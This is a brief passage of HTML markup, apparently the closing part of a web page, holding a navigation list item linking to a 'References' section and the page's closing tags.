        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












